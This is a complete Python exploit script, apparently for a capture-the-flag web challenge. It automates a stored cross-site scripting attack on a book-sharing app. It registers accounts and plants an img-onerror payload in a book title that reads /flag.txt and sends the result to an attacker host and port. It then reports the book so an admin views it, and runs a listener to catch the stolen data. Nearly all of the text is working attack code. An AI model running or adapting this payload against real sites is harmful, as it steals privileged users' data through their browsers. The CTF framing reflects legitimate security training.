#!/usr/bin/env python3
"""
exploit_full.py

Automates:
  - registering 2 users (attacker_user, reporter_user)
  - logging in
  - creating a book (title contains XSS payload)
  - reporting that book (so admin will view the share link)
  - running an HTTP listener to receive the exfiltrated flag

Default target: http://localhost:50001
Default listener: binds 0.0.0.0:9001 (payload uses attacker_host:attacker_port)

Usage:
  python3 exploit_full.py --target http://localhost:50001 --att-host localhost --att-port 9001

Notes:
  - The admin must visit the share link (e.g., via admin UI). That step is usually manual in the CTF:
    Log into the admin account in another browser and click the reported share link.
  - If admin browser runs on same host, set att-host to 'localhost'. If remote, use a reachable IP.
"""

import argparse
import requests
import threading
import http.server
import socketserver
import urllib.parse
import time
import sys
import random
import string
import json

# ---------- Configuration ----------
DEFAULT_TARGET = "http://localhost:50001"
LISTEN_HOST = "0.0.0.0"   # bind for listener
LISTEN_PORT = 9001
# -----------------------------------

FLAG_EVENT = threading.Event()
RECEIVED_FLAG = None

class ReceiverHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        global RECEIVED_FLAG
        parsed = urllib.parse.urlparse(self.path)
        q = urllib.parse.parse_qs(parsed.query)
        if 'flag' in q:
            RECEIVED_FLAG = q['flag'][0]
            print("\n[+] Received flag via GET:", RECEIVED_FLAG)
            FLAG_EVENT.set()
        else:
            print("[*] GET:", self.path)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok\n")
    def do_POST(self):
        global RECEIVED_FLAG
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length) if length>0 else b''
        RECEIVED_FLAG = body.decode(errors='replace')
        print("\n[+] Received flag via POST:", RECEIVED_FLAG)
        FLAG_EVENT.set()
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"received\n")
    def log_message(self, fmt, *args):
        return

def start_listener(bind_host, bind_port):
    with socketserver.TCPServer((bind_host, bind_port), ReceiverHandler) as httpd:
        print(f"[+] Listener up at http://{bind_host}:{bind_port}")
        while not FLAG_EVENT.is_set():
            httpd.handle_request()
        print("[*] Listener shutting down")

def randstr(n=6):
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))

def register(session, target, username, password):
    url = f"{target}/register"
    params = {"username": username, "password": password}
    r = session.post(url, params=params, timeout=5)
    return r

def login_and_set_cookie(session, target, username, password):
    url = f"{target}/api/login"
    params = {"username": username, "password": password}
    r = session.post(url, params=params, timeout=5)
    if r.status_code == 200:
        try:
            j = r.json()
            token = j.get("token")
            if token:
                # set cookie named "token" (server uses cookieParser; utils.authCheck likely reads token from cookie)
                session.cookies.set("token", token, domain="localhost")
                print(f"[+] Logged in as {username}, token saved to session cookie")
                return True
        except Exception:
            pass
    print(f"[-] Login failed for {username} (status {r.status_code}) - response: {r.text[:200]}")
    return False

def create_book(session, target, payload_title):
    url = f"{target}/api/create"
    # required fields per server: title, author, pages, imageLink, link, fav, read
    data = {
        "title": payload_title,
        "author": "Exploit Author",
        "pages": 123,
        "imageLink": "/assets/icons/bookshelf.svg",
        "link": "",
        "fav": False,
        "read": False
    }
    r = session.post(url, json=data, timeout=5)
    if r.status_code == 200:
        try:
            j = r.json()
            if j.get("status") == "ok" or "book" in j:
                book = j.get("book", {})
                liteId = book.get("liteId")
                print(f"[+] Created book with liteId: {liteId}")
                return liteId
        except Exception:
            pass
    print(f"[-] Failed to create book: status {r.status_code}, resp: {r.text[:200]}")
    return None

def report_book(session, target, owner_user, liteId):
    url = f"{target}/report"
    data = {"user": owner_user, "liteId": liteId}
    r = session.post(url, json=data, timeout=5)
    if r.status_code == 200:
        print(f"[+] Reported book {owner_user}/{liteId}")
        return True
    else:
        print(f"[-] Reporting failed: {r.status_code} {r.text[:200]}")
        return False

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", "-t", default=DEFAULT_TARGET, help="Base URL of target (e.g. http://localhost:50001)")
    parser.add_argument("--att-host", default="localhost", help="Host the payload will contact (from admin browser view)")
    parser.add_argument("--att-port", default=LISTEN_PORT, type=int, help="Port the payload will contact")
    parser.add_argument("--listen-host", default=LISTEN_HOST, help="Bind address for listener")
    parser.add_argument("--listen-port", default=LISTEN_PORT, type=int, help="Listener port")
    args = parser.parse_args()

    target = args.target.rstrip("/")
    attacker_host_in_payload = args.att_host
    attacker_port_in_payload = args.att_port

    # craft XSS payload: image-onerror beacon (works without CORS)
    payload_title = (
        '<img src=x onerror="'
        f"fetch('/flag.txt').then(r=>r.text()).then(s=>{{var i=new Image();i.src='http://{attacker_host_in_payload}:{attacker_port_in_payload}/?flag='+encodeURIComponent(s);}})"
        '">'
    )

    print("[*] Payload that will be injected into book title:\n")
    print(payload_title)
    print()

    # start listener thread
    t = threading.Thread(target=start_listener, args=(args.listen_host, args.listen_port), daemon=True)
    t.start()
    time.sleep(0.2)

    # create two sessions: attacker and reporter
    s_att = requests.Session()
    s_rep = requests.Session()

    # choose usernames that match server regexp [a-z\d]{5,30}
    attacker_user = "attk" + randstr(4)
    reporter_user = "rptr" + randstr(4)
    pwd = "Pass123"

    print(f"[*] Registering attacker user: {attacker_user}")
    r = register(s_att, target, attacker_user, pwd)
    print(f"  -> status {r.status_code}")

    print(f"[*] Registering reporter user: {reporter_user}")
    r = register(s_rep, target, reporter_user, pwd)
    print(f"  -> status {r.status_code}")

    # login
    print("[*] Logging in attacker...")
    if not login_and_set_cookie(s_att, target, attacker_user, pwd):
        print("[-] Attacker login failed, abort.")
        return

    print("[*] Creating malicious book as attacker ...")
    liteId = create_book(s_att, target, payload_title)
    if not liteId:
        print("[-] Book creation failed. Aborting.")
        return

    # login reporter and report the attacker book
    print("[*] Logging in reporter...")
    if not login_and_set_cookie(s_rep, target, reporter_user, pwd):
        print("[-] Reporter login failed, abort.")
        return

    print("[*] Reporting the attacker book (so admin sees the report)...")
    if not report_book(s_rep, target, attacker_user, liteId):
        print("[-] Reporting failed; manual report may be required.")
        print(f"    Share link (manual): {target}/liteShare/{attacker_user}/{liteId}")
    else:
        print(f"[+] Report submitted. Admin should visit {target}/liteShare/{attacker_user}/{liteId}")

    print("\n[*] Now wait for admin to visit the share link. Listener will print the flag when received.")
    try:
        FLAG_EVENT.wait(timeout=600)  # wait up to 10 minutes
    except KeyboardInterrupt:
        print("User aborted")

    if RECEIVED_FLAG:
        print(f"[+] Done. Flag: {RECEIVED_FLAG}")
    else:
        print("[-] No flag received within timeout. Check admin visited the share link and that attacker host is reachable by admin browser.")
        print("Manual share link to open by admin:")
        print(f"{target}/liteShare/{attacker_user}/{liteId}")

if __name__ == "__main__":
    main()

